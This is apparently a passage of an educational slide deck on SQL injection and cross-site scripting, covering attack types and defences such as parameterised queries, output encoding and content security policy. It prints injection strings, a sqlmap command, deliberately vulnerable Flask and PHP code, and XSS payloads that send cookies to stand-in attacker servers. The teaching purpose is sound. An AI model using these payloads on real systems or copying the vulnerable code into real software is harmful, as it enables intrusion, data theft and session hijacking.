query = "SELECT * FROM users WHERE user_id = " + user_id
Injection Scenario:
If a user enters 1; DROP TABLE users;, the query becomes:
SELECT * FROM users WHERE user_id = 1; DROP TABLE users;
This would result in deleting the users table due to unsanitised input.

### Notes:

<!-- Slide number: 103 -->
# Sql injection by error introduction
Error-based SQL Injection is a technique where attackers intentionally introduce errors into SQL queries to trigger database error messages.
These error messages often reveal information about the database structure, table names, column names, data types, or other implementation details.
Example:
SELECT * FROM users WHERE user_id = 1' OR '1'='1;
The inclusion of the single quote (') after user_id = 1 is likely to cause a syntax error in SQL.
This error may result in a detailed message indicating where the syntax fails, revealing information about table structure or column names.

### Notes:

<!-- Slide number: 104 -->
# Sql injection based on union operator
Uses the UNION SQL operator to combine the results of two SELECT queries into a single result, exposing additional data.
For UNION to work, both queries must have the same number of columns, and the data types in corresponding columns must be compatible:
SELECT name, email FROM users WHERE user_id = 1 UNION SELECT username, password FROM admin; --
By crafting the query correctly, attackers can combine the results of the legitimate query with results from a table they want to access, effectively retrieving data they wouldn’t normally be able to view.

### Notes:

<!-- Slide number: 105 -->
# Blind Sql injection
Exploits conditional responses without error messages.
Boolean-Based: Uses true/false queries to test database responses.
SELECT * FROM users WHERE user_id = 1 AND 1=1; --
Here, 1=1 is always true. If this query returns results, it confirms that the injected condition (1=1) was executed by the database, which suggests that the application is vulnerable to SQL injection. The response to this query also indicates that the attacker’s input can manipulate the SQL query structure.
SELECT * FROM users WHERE user_id = 1 AND 1=2; --
Here, 1=2 is always false. If this query returns no results or a different response than the first query, it further confirms that the attacker can control the query and inject conditions.

### Notes:

<!-- Slide number: 106 -->
# TIME BASED Sql injection
Attackers inject SQL code that includes commands to delay the database response.
SELECT * FROM users WHERE user_id = 1; WAITFOR DELAY '00:00:05'; --
If the delay occurs, it means the condition (user_id = 1) is true.
If the delay does not occur, it means the condition is false.
This allows attackers to gather information about the database without needing direct access to query results or error messages.

### Notes:

<!-- Slide number: 107 -->
# Advanced techniques- subquery Sql injection
Attacker uses a subquery within their injection to retrieve specific data from the database.
A subquery is a nested query inside another SQL query, which can be used to perform complex data retrieval operations.
By injecting subqueries, attackers can craft SQL commands that extract additional data beyond what was originally intended by the application.
SELECT * FROM users WHERE user_id = (SELECT MAX(user_id) FROM users); --
-

### Notes:

<!-- Slide number: 108 -->
# Advanced techniques- stacked queries
Attacker appends additional SQL commands after the original query.

These additional commands are separated by a semicolon (;), which is commonly used in SQL to indicate the end of a statement and the beginning of a new one.

SELECT * FROM users WHERE user_id = 1; UPDATE users SET role = 'admin' WHERE user_id = 1; --
This second stacked query modifies the users table, setting the role of the user with user_id = 1 to admin, effectively granting them administrator privileges.

### Notes:

<!-- Slide number: 109 -->
# A real-world example
Scenario: A login form with a simple query to check credentials.
username = input("Enter your username: ")
password = input("Enter your password: ")
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "';"
Injected Input:
Username: admin' --
Password: anything (ignored due to comment --)
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything';
Effect: Logs in as admin by bypassing password check, as -- comments out the rest of the SQL statement.

### Notes:

<!-- Slide number: 110 -->
# Reasons sql injection prevention is crucial
SQL Injection Risks:
Unchecked SQL injection vulnerabilities allow attackers to manipulate databases, access sensitive data, and even control systems.
Common Attack Surfaces:
Web forms, URL parameters, cookies, and headers are all potential entry points for SQLi attacks.
 Prevention Goals:
Ensure that all user inputs are treated as data, not as part of the SQL command.
Separate application logic from data processing to reduce attack surfaces.

### Notes:

<!-- Slide number: 111 -->
# Basic principles of input validation
Input validation ensures that only valid, expected data can reach the database.
Basic Rules:
Reject inputs with SQL-specific characters (e.g., ', --, ;).
Allow only characters suitable for the field type (e.g., numbers for IDs, letters for names).
Example of Basic Input Validation (Python):
import re
def validate_username(username):
    # Allow only alphanumeric characters for usernames
    if re.match("^[a-zA-Z0-9_]+$", username):
        return True
    return False

### Notes:

<!-- Slide number: 112 -->
# More of input validation techniques
Whitelist Validation:
o	Define strict rules on allowed input characters for each field.
o	Example: For email validation:
import re
def validate_email(email):
    # Basic email pattern
    pattern = r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$'
    return re.match(pattern, email)

### Notes:

<!-- Slide number: 113 -->
# Parameterised Queries – prepared statement
Prepared statements separate SQL code from user inputs, reducing the risk of SQL Injection.
Prevents user input from altering SQL structure.
Adds a layer of abstraction, ensuring inputs are always treated as data.
Prepared Statement Example in Python (MySQL):
query = "SELECT * FROM users WHERE username = %s AND password = %s"
cursor.execute(query, (username, password))

### Notes:

<!-- Slide number: 114 -->
# Using Object-Relational Mapping (ORM) Tools
What is an ORM?:
ORMs abstract SQL by allowing developers to interact with databases through object-oriented code.
ORM Benefits:
Automatically parameterises queries, reducing SQL injection risk.
Enforces data consistency and eases query handling.

### Notes:

<!-- Slide number: 115 -->
# Example Using SQLAlchemy in Python
from sqlalchemy import create_engine, Table, Column, Integer, String, MetaData
from sqlalchemy.orm import sessionmaker

class User(Base):
    __tablename__ = 'users'
    id = Column(Integer, primary_key=True)
    username = Column(String)
    email = Column(String)

# Querying with ORM, which is safe from SQL injection
user = session.query(User).filter_by(username='admin').first()

### Notes:

<!-- Slide number: 116 -->
# Security Audits – Practices and tools
Common SQL Injection Testing Tools:
SQLMap: Open-source tool for automating SQL injection discovery and exploitation.
Burp Suite: Professional tool for testing and vulnerability assessment, including SQLi detection.
Example:
sqlmap -u "http://example.com/page?id=1" --batch --dbs
SQLMap automatically detects and tests for SQL Injection vulnerabilities in the specified URL.

### Notes:

<!-- Slide number: 117 -->
# Mitigation Strategies - others
Principle of Least Privilege:
Limit database access rights to the minimum required for each user or application.
Stored Procedures and Views:
Encapsulate queries in stored procedures, reducing direct access to tables.
Web Application Firewalls (WAF):
Use a WAF to monitor and block SQL Injection attacks in real-time.
Security Policy:
Establish and enforce a security policy that mandates safe coding practices, including SQLi prevention measures.

### Notes:

<!-- Slide number: 118 -->
# summary
SQL Injection (SQLi) is a security vulnerability that allows attackers to manipulate SQL queries by injecting malicious code through user inputs.
Ranked in the OWASP Top 10 vulnerabilities; can lead to data breaches, unauthorised access, and database manipulation.
Types of SQL Injection:
Error-Based: Exploits database error messages to reveal structure and data.
Union-Based: Uses UNION to combine results from different tables, exposing additional data.

### Notes:

<!-- Slide number: 119 -->
# summary
Blind SQL Injection:
Boolean-Based: Infers data through true/false conditions.
Time-Based: Uses delays to infer conditions.
Prevention Techniques:
Parameterised Queries: Use placeholders to separate SQL code from data.
Input Validation: Filter and sanitise all user inputs to prevent unexpected SQL syntax.
Least Privilege Principle: Restrict database permissions to minimise impact.

### Notes:

<!-- Slide number: 120 -->
# Activity (3-5 mINS)
Discuss on how you can mitigate any of the type of SQL injections (e.g., in-band SQL injection) in a website.

### Notes:

<!-- Slide number: 121 -->
# Xss - Cross site scripting

### Notes:

<!-- Slide number: 122 -->
# CROSS SITE SCRIPTING-XSS
Objectives:
Understanding Cross-Site Scripting (XSS)
How XSS Attacks Occur
Risks and Impacts
Why XSS is Still Prevalent

### Notes:

<!-- Slide number: 123 -->
# CROSS SITE SCRIPTING-XSS
Understanding Cross-Site Scripting (XSS):
A major web vulnerability and one of the OWASP Top 10.
XSS enables attackers to inject JavaScript (or other client-side code) into web pages.
How XSS Attacks Occur:
Attackers embed scripts into pages, which execute when a user visits the site.
Risks and Impacts:
Minor issues, such as alert pop-ups, to major impacts like full account takeovers.
Why XSS is Still Prevalent:
Despite filtering and input sanitisation, user input display is critical to the web.
Mistakes in sanitising input will persist, making XSS an ongoing challenge.

### Notes:

<!-- Slide number: 124 -->
# CROSS SITE SCRIPTING-XSS
What is XSS?
Cross-Site Scripting (XSS) is a web security vulnerability that allows attackers to inject malicious scripts (often JavaScript) into a webpage. The attack targets a website vulnerability to deliver harmful code to users, exploiting their trust in the site.
Types of XSS:
Stored XSS: Malicious code is stored on the server (e.g., in a database), then displayed to users who access that content.
Reflected XSS: The code is reflected off a web server (e.g., via a URL parameter) and immediately executed in the user’s browser.
DOM-based XSS: Occurs when JavaScript directly modifies the Document Object Model (DOM), causing execution without any server interaction.

### Notes:

<!-- Slide number: 125 -->
# How it works
Vulnerability Explanation:
An XSS vulnerability occurs when a website fails to properly sanitise or encode user-provided input. If this input is embedded in a webpage without filtering, it can execute in another user's browser as legitimate content.
from flask import Flask, request, render_template_string
app = Flask(__name__)
@app.route('/')
def index():
    user_input = request.args.get('input', '')
    html_content = f"<p>Form input was {user_input}</p>"
    return render_template_string(html_content)
if __name__ == '__main__':
    app.run(debug=True)
In this example, user_input is embedded directly into the HTML without sanitisation, making it vulnerable to XSS.

### Notes:

<!-- Slide number: 126 -->
# capabilities of XSS
What Attackers Can Achieve with XSS:
Session Hijacking: Attacker steals session cookies, allowing them to impersonate the user.
Keylogging: Captures sensitive keystrokes, like login credentials.
Phishing: Displays fake forms to collect sensitive information.
JavaScript Capabilities in the Browser:
Access Cookies:	console.log(document.cookie);
Send HTTP Requests:	fetch("http://malicious-website.com/steal-data?cookie=" + document.cookie);
Modify DOM:	document.body.innerHTML = "<h1>Hacked</h1>";

### Notes:

<!-- Slide number: 127 -->
# XSS prevention strategies
What is XSS?
Cross-Site Scripting (XSS) is a web security vulnerability that allows attackers to inject malicious scripts (often JavaScript) into a webpage. The attack targets a website vulnerability to deliver harmful code to users, exploiting their trust in the site.
Types of XSS:
Stored XSS: Malicious code is stored on the server (e.g., in a database), then displayed to users who access that content.
Reflected XSS: The code is reflected off a web server (e.g., via a URL parameter) and immediately executed in the user’s browser.
DOM-based XSS: Occurs when JavaScript directly modifies the Document Object Model (DOM), causing execution without any server interaction.

### Notes:

<!-- Slide number: 128 -->
# User inputs sanitisation challenges
Wide Range of Characters and Encodings:
Users may use character encoding tricks to evade filters. For instance, encoding <script> as &#60;script&#62; can bypass simplistic filters that only search for <script>.
Example:
	&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;
Challenge: Filters must account for multiple encoding schemes, such as HTML entities, Unicode, and URL encoding.
Evasion Techniques Using Nested Tags:
Attackers may use nested or broken tags to slip past filters that don’t handle these cases properly.
Example:
	<img src="x" onerror="javasc" + "ript:alert('XSS')">
Challenge: Filters need to detect partial or concatenated code strings that are reconstructed when rendered in the browser.

### Notes:

<!-- Slide number: 129 -->
# User inputs sanitisation challenges
Mixed Content and Event Handlers:
Attackers can use event handlers on various tags (like onload, onclick, onerror) to inject code without using <script> tags directly.
Example:
	<div onmouseover="alert('XSS')">Hover over me</div>
Challenge: Effective filters must account for all HTML elements and their attributes, not just traditional <script> tags.
Allowed Formatting Tags (e.g., Markdown or Rich Text):
In environments allowing basic formatting (like bold or italic text), users may exploit these to execute scripts.
Example in Markdown:
	[Click me](javascript:alert('XSS'))
Challenge: Developers must balance allowing some HTML/Markdown for user experience while strictly filtering dangerous content.

### Notes:

<!-- Slide number: 130 -->
# Challenges in Sanitising User Input
Different browsers may interpret the same HTML differently, sometimes allowing exploits on one browser but not others.
Challenge: Filters must handle cross-browser quirks and account for various interpretations of HTML to ensure consistency across platforms.
Performance Implications of Deep Filtering:
Complex filtering can impact performance, especially on pages with heavy user interaction or large amounts of data.
Challenge: Striking a balance between effective filtering and acceptable application performance, especially for high-traffic or dynamic websites.

### Notes:

<!-- Slide number: 131 -->
# Identifying Potential XSS Points
Conducting a Code Audit:
Identify places where user input is received (e.g., form fields, URL parameters).
Trace where this data is displayed on the site to identify XSS risks.
Common User Input Areas for XSS:
Usernames, posts, messages.
Administrative views that display user information, such as browser or user-agent strings.
Questions to Ask During Audit:
Is the data sanitised?
When is it sanitised? Before storing or displaying?
How is it sanitised? Using a library or a custom approach?

### Notes:

<!-- Slide number: 132 -->
# Testing for XSS
Manual Testing for XSS:
Test inputs using common XSS payloads:
	<script>alert("XSS Test")</script>

Push the boundaries of filtering by trying variations, like HTML entities:
	<img src="x" onerror="alert('XSS’)”>

Automated Testing:
Use tools like Burp Suite, XSSer, or XSStrike to automate payload testing.

### Notes:

<!-- Slide number: 133 -->
# Types of Cross-Site Scripting (XSS)
Main Types of XSS:
Reflected XSS:
Code injected through a single request, visible only to the specific user.
Stored XSS:
Code stored on the server and displayed to multiple users.
DOM-based XSS:
Code directly modifies the page structure via the DOM, often using JavaScript.

### Notes:

<!-- Slide number: 134 -->
# Reflected XSS
  Definition:
Reflected XSS occurs when malicious code is included in the request and is immediately returned to the user without any server-side storage. Though generally considered less severe, it is still risky and often relies on social engineering (like phishing) to get the user to click a link.
 Characteristics:
Code is only visible to the user who initiated the request.
Often relies on social engineering (e.g., sending a phishing link).
 Example Code
app = Flask(__name__)
@app.route('/reflected_xss', methods=['GET'])

def reflected_xss():
user_input = request.args.get('forminput', '')
html_content = f"""

### Notes:

<!-- Slide number: 135 -->
# Reflected XSS
  <html>
      <body>
        <form action="/reflected_xss" method="GET">
          <input type="text" name="forminput">
          <button type="submit">Submit</button>
        </form>
        <p>Form input was: {user_input}</p>
      </body>
    </html>
    """
    return render_template_string(html_content)

app.run()

This code takes user input from a GET request and immediately returns it to the browser without sanitisation, making it vulnerable to reflected XSS attacks.

### Notes:

<!-- Slide number: 136 -->
# XSS - Payload Example
 http://localhost:5000/reflected_xss?forminput=<script>alert("Hacked!");</script>
The URL contains a malicious script injected directly into the forminput parameter.
 When this URL is accessed, the script <script>alert("Hacked!");</script> is included in the page response without any filtering or sanitisation.
What Happens:
When a user clicks this link, their browser interprets the injected JavaScript and executes the command alert("Hacked!").
Result: The alert("Hacked!") displays a popup box with the message "Hacked!," demonstrating a successful XSS attack where the user’s browser runs code injected by the attacker.

### Notes:

<!-- Slide number: 137 -->
# XSS - Phishing Example
 An attacker could embed this malicious link within a legitimate-looking anchor tag, disguising it as a secure link.
<a href="http://localhost:5000/reflected_xss?forminput=<script>alert('Hacked!');</script>">
  Click here for a secure login
</a>
By embedding the link in a phishing email, the attacker tricks the user into clicking it, triggering the XSS payload and potentially exposing sensitive data.

### Notes:

<!-- Slide number: 138 -->
# Stored XSS
Stored XSS, also known as "persistent XSS," occurs when malicious code is saved on the server (e.g., in a database) and served to users. This is often seen in forum posts, comment sections, or profile pages.
Characteristics:
Code is stored on the server and displayed to all users viewing that content.
Can impact a large number of users with minimal effort from the attacker.

### Notes:

<!-- Slide number: 139 -->
# Stored XSS
 Example:
<!-- Message board post form -->
<form action="submit_post.php" method="POST">
  <input type="text" name="message">
  <button type="submit">Post</button>
</form>
<!-- Display stored messages (pseudo code) -->
<div id="messages">
  <?php echo $messageFromDatabase; ?>
</div>
User submits the message:
<script>alert("Hacked!")</script>
If left as is, this will trigger a scripted alert for every user viewing the post.

### Notes:

<!-- Slide number: 140 -->
# DOM-Based XSS
 DOM-based XSS manipulates the page structure (DOM) directly using JavaScript.
Unlike stored or reflected XSS, DOM XSS doesn’t require server-side processing; it occurs entirely in the user’s browser.
Characteristics:
Often utilises JavaScript methods to modify the page.
Can be initiated via URL fragments (i.e., anything after # in the URL).

### Notes:

<!-- Slide number: 141 -->
# DOM-Based XSS
Example:
<html>
  <body>
    <script>
      // Display the current URL on the page
      document.write("<p>Current URL: "
         + document.location + "</p>");
    </script>
  </body>
</html>

### Notes:

<!-- Slide number: 142 -->
# Payload Example Using URL Fragment
http://example.com/page#<script>alert("Hacked")</script>
The above URL would cause the previous script to execute within the page due to document.write reading the URL.
Prevention for DOM XSS:
Avoid unsafe JavaScript methods like document.write and element.innerHTML.
Use safer alternatives like element.textContent and element.innerText, which do not interpret HTML tags.

### Notes:

<!-- Slide number: 143 -->
# Preventing Reflected and Stored XSS
Key Strategies:
Input Sanitisation:
Always validate and filter user input, particularly for special characters.

Output Encoding:
Convert characters like < and > into their HTML-safe equivalents to avoid script execution.
PHP example: echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');

Set Content Security Policy (CSP):
A CSP limits the sources from which scripts can be loaded.
Header example : Content-Security-Policy: default-src 'self';

### Notes:

<!-- Slide number: 144 -->
# Common attack - Window Relocation
Challenges with DOM XSS:
Since DOM XSS can occur on the client-side, server-based protections may not be effective.
Key Preventative Methods:
Avoid Unsafe Methods: Do not use document.write, innerHTML for user-controlled input.
Use Safe Methods:
element.textContent: Displays text without rendering HTML.
element.setAttribute: Safely sets HTML element attributes.
Unsafe Example:
document.getElementById("output").innerHTML = userInput; // Unsafe
Safe Example:
document.getElementById("output").textContent = userInput; // Safe

### Notes:

<!-- Slide number: 145 -->
# Preventing DOM-Based XSS
Purpose: Use JavaScript to redirect the user to a fake page that mimics the original site (e.g., a login page) to capture credentials.
Attack Strategy:
o	Create a fake version of a legitimate page to trick users into entering credentials.
o	Redirect back to the original site once credentials are harvested to minimise suspicion.
Example :
<script>window.location="http://127.0.0.1:8000/fake_login";</script>
Demo Button:<button onclick="window.location='http://127.0.0.1:8000/fake_login'">Click to Go Home</button>
In practice, this link could be hidden behind a URL that looks legitimate.

### Notes:

<!-- Slide number: 146 -->
# Manipulating Browser Behaviour
Purpose: Exploit JavaScript’s access to the current session to retrieve sensitive data or manipulate the browser's behaviour.
Example: Retrieve Cookies:
<script>alert(document.cookie);</script>

This code displays all current cookies, which could include session cookies used for authentication.
Demo Button:
<button onclick="alert(document.cookie)">Click for Cookies</button>

### Notes:

<!-- Slide number: 147 -->
# Example - Access Local Storage
<script>alert(localStorage.key(0) + " : " + localStorage.getItem(localStorage.key(0)));</script>
Local storage might contain saved session data or user preferences, which could be exploited.
Demo Button:
<button onclick="alert(localStorage.key(0) + ' : ' + localStorage.getItem(localStorage.key(0)))">Click for Local Storage Data</button>

### Notes:

<!-- Slide number: 148 -->
# Redirected Session Hijacking
Purpose:
Combine redirection and cookie access to send a user’s session information to an external server, allowing session hijacking.
Payload:
<script>window.location="http://evilServer.com/?cookie=" + document.cookie;</script>
Redirects the user to an attacker-controlled server with their session data appended.

### Notes:

<!-- Slide number: 149 -->
# Subtle Session Hijacking
Purpose: Avoiding obvious redirects or error messages to maintain stealth.
Alternative Methods:
Error Pages: Direct users to an error page and hope they return to the legitimate page using the back button.
Image Request: Use an invisible image to send data to an external server without disrupting the user’s browsing experience.
Image-Based Example:
<script>new Image().src="http://127.0.0.1:8000/evil.php?cookie=" + document.cookie;</script>

Sends session data to an attacker’s server without altering the current page.
Demo Button:
<button onclick="new Image().src='http://127.0.0.1:8000/evil.php?cookie=' + document.cookie">Send Cookies Remotely</button>

### Notes:

<!-- Slide number: 150 -->
# Alternatives to <script> Tags
onload Event: Executes when the page loads.
<body onload="alert('XSS');">
Mouse Events: Executes when the user interacts with the page (e.g., onmouseover).
<div onmouseover="alert('XSS');">Hover over me!</div>
Error Events: Executes when an image fails to load.
<img src="nonexistent.png" onerror="alert('XSS');">

### Notes:

<!-- Slide number: 151 -->
# Summary
Types of XSS:
Reflected XSS: Malicious code injected and immediately reflected back to the user, often via URL. Requires social engineering (e.g., phishing links).
Stored XSS: Code stored on the server and displayed to multiple users (e.g., in comments, posts). Can affect all users viewing the content.
DOM-Based XSS: Injected code directly modifies the Document Object Model (DOM) on the client side. Often relies on JavaScript and URL fragments.

### Notes:

<!-- Slide number: 152 -->
# Summary
Common Attack Techniques:
Window Relocation: Redirects user to a fake page to capture credentials.
Cookie and Data Scraping: Accesses cookies, local storage, and session data.
Subtle Hijacking: Uses invisible requests (e.g., images) to avoid detection.

### Notes:

<!-- Slide number: 153 -->
# summary
Prevention Strategies:
Sanitise User Input: Filter and validate all inputs rigorously.
Output Encoding: Convert characters to HTML-safe equivalents.
Content Security Policy (CSP): Restrict the sources for scripts and data.
Avoid Unsafe JavaScript Functions: Limit use of document.write and innerHTML.

### Notes:

<!-- Slide number: 154 -->
# Activity (3-5 mins)
Discuss on how you can mitigate any of the type of XSS in a website.

### Notes:

<!-- Slide number: 155 -->
# Thank you

![Mountains under near dusk sky](PicturePlaceholder14.jpg)

### Notes:
